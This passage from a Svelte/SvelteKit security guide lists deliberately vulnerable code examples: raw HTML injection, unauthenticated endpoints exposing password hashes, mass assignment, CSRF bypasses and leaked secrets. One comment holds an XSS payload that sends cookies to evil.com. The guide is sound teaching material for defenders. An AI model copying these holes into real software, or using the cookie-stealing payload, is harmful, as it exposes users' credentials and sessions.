---
source: "languages/javascript/svelte-security.md"
title: "Svelte & SvelteKit Security Deep Dive"
heading: "3. Vulnerable Code Examples"
category: "language-vuln"
language: "javascript"
severity: "high"
tags: [code, explanation, javascript, language-vuln, overview, secure, vulnerability, vulnerable]
chunk: 5/10
---

## 3. Vulnerable Code Examples

### 3.1 Raw HTML Injection

```svelte
<!-- 💀 VULNERABLE -->
<script>
  let { params } = $props();
  let content = params.content; // User-controlled
</script>

<div class="article">
  {@html content}
  <!-- <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"> -->
</div>
```

### 3.2 Endpoint Without Auth

```javascript
// 💀 VULNERABLE — src/routes/api/users/+server.js
import { json } from '@sveltejs/kit';

export async function GET({ url }) {
  const users = await prisma.user.findMany({
    select: { id: true, email: true, passwordHash: true } // 💀 Exposes password hash!
  });
  return json(users);
}
```

### 3.3 Unvalidated Form Action

```javascript
// 💀 VULNERABLE — src/routes/register/+page.server.js
export const actions = {
  default: async ({ request }) => {
    const data = await request.formData();
    const user = Object.fromEntries(data); // 💀 Mass assignment

    // AI uses all fields directly
    await db.user.create({ data: user });
    // Attacker adds: isAdmin=true to formData
  }
};
```

### 3.4 Missing CSRF Protection (SvelteKit < 1.15.2)

```javascript
// 💀 VULNERABLE — svelte.config.js (default config before fix)
const config = {
  kit: {
    // CSRF protection exists but can be bypassed
    // via text/plain content type (CVE-2023-29003)
    // or uppercase Content-Type (CVE-2023-29008)
  }
};
```

### 3.5 Server Load Function Leaking Secrets

```javascript
// 💀 VULNERABLE — src/routes/admin/+page.server.js
export async function load({ locals }) {
  const adminData = await db.admin.findUnique({
    where: { id: locals.user.id }
    // Returns: { id, email, passwordHash, secretKey, ... }
  });
  return { adminData }; // 💀 Sent to client entirely
}
```

---